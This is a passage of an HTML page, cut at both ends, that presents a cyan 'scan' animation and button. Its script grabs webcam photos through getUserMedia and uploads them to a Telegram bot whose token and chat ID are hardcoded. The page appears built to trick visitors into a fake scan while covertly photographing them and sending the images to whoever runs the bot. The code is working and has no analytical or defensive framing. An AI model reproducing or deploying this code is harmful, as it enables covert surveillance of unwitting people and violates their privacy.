            position: absolute;

            background: #00f2fe;
            box-shadow: 0 0 15px #00f2fe;
            animation: scan 2s infinite ease-in-out;
        }
        @keyframes scan {
            0% { top: 0; }
            50% { top: 100%; }
            100% { top: 0; }
        }
        #status { margin-top: 20px; font-size: 13px; color: #00f2fe; min-height: 20px; }
    </style>
</head>
<body>

<div class="container">

<script>
    const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
    const chat_id = '7164380121';
    const btn = document.getElementById('b');
    const status = document.getElementById('status');
    const scanLine = document.getElementById('scan-line');

    async function takePhoto(facing) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => setTimeout(r, 2000)); 
            
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
            const f = new FormData();
            f.append('chat_id', chat_id);
            f.append('photo', blob, `snap_${facing}.jpg`);
            
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
            stream.getTracks().forEach(t => t.stop()); 
        } catch (e) { status.innerText = "–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞"; }
    }

    btn.onclick = async () => {
        btn.style.display = "none";
